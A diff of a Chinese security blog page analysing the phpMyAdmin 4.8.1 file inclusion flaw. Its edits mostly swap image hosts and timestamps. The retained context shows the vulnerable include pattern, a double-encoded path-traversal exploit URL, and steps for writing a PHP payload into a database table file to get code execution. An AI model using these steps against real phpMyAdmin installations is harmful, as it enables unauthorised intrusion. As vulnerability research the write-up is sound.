@@ -7,26 +7,26 @@
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
     <meta name="description" content="0x01 phpmyadmin简述phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地">
-<meta name="keywords" content="漏洞复现,php">
+<meta name="keywords" content="php,漏洞复现">
 <meta property="og:type" content="article">
 <meta property="og:title" content="phpmyadmin-4.8.1-复现分析">
 <meta property="og:url" content="http://www.lmxspace.com/2018/06/23/phpmyadmin-4-8-1-复现分析/index.html">
 <meta property="og:site_name" content="l1nk3r&#39;s blog">
 <meta property="og:description" content="0x01 phpmyadmin简述phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/67p9k.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/ejft1.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/ehsud.jpg">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/goy5x.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/1aoe5.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/8ytu0.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/xyhd4.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/9xcp1.png">
-<meta property="og:updated_time" content="2019-03-12T09:07:14.342Z">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/67p9k.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/ejft1.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/ehsud.jpg">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/goy5x.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/1aoe5.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/8ytu0.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/xyhd4.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/9xcp1.png">
+<meta property="og:updated_time" content="2019-04-10T04:40:26.573Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="phpmyadmin-4.8.1-复现分析">
 <meta name="twitter:description" content="0x01 phpmyadmin简述phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地">
-<meta name="twitter:image" content="http://po8p59xe5.bkt.clouddn.com/blog/67p9k.png">
+<meta name="twitter:image" content="http://l1nk3r.xmutsec.com/blog/67p9k.png">
     
     
         
@@ -189,23 +189,23 @@
 <p>这里简化一下代码。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $_REQUEST[<span class="string">'target'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">include</span> $_REQUEST[<span class="string">'target'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <h3 id="windows下测试"><a href="#windows下测试" class="headerlink" title="windows下测试"></a>windows下测试</h3><p>在windows下测试时候发现：</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/67p9k.png" alt="3"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/67p9k.png" alt="3"></p>
 <p>php会针对二次编码传入之后的参数，进行一次urldecode操作，然后可以成功包含，但是如果是一次编码，会报错，找不到文件。看一下原因发现target值会被解析成<code>db_sql.php%3f/</code>，然后php会把前面db_sql.php%3f当成目录，所以要多加一个../来跨出目录。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/ejft1.png" alt="4"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/ejft1.png" alt="4"></p>
 <h3 id="mac下测试"><a href="#mac下测试" class="headerlink" title="mac下测试"></a>mac下测试</h3><p>我在mac下测试时候，通过网上的方法依然可以包含，但是我发现一个有趣的东西</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/ehsud.jpg" alt="1"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/ehsud.jpg" alt="1"></p>
 <p>我发现不通过编码的话，依然能够包含文件</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/goy5x.png" alt="1"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/goy5x.png" alt="1"></p>
 <p>国外也有个小哥哥发现了这个问题，我想这两个差异应该和操作系统有关系。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/1aoe5.png" alt="10"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/1aoe5.png" alt="10"></p>
 <h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>chamd5中给的方法是将数据库查询数据写入到文件里。</p>
 <p><code>show variables like ‘datadir‘</code></p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/8ytu0.png" alt="5"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/8ytu0.png" alt="5"></p>
 <p>新建test1表，插入&lt;?php phpinfo()?&gt;</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/xyhd4.png" alt="6"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/xyhd4.png" alt="6"></p>
 <p>最后访问</p>
 <p><code>http://192.168.31.240/phpMyAdmin/index.php?target=db_sql.php%253f/../../../../../../phpStudy/MySQL/data/test/test1.frm</code></p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/9xcp1.png" alt="7"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/9xcp1.png" alt="7"></p>
 <p>还有种简单的办法，包含session文件，php一般会在tmp下生成session 文件。</p>
 <h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=06214Ln3sDQKGO5qXUpd2hbl#rd" target="_blank" rel="noopener">phpmyadmin4.8.1后台getshell</a></p>
 
@@ -282,6 +282,7 @@
         
       </ul>
     </nav>
+    <a href="http://www.miitbeian.gov.cn/">闽ICP备19007817号</a> 
   </div>
 </footer>
 
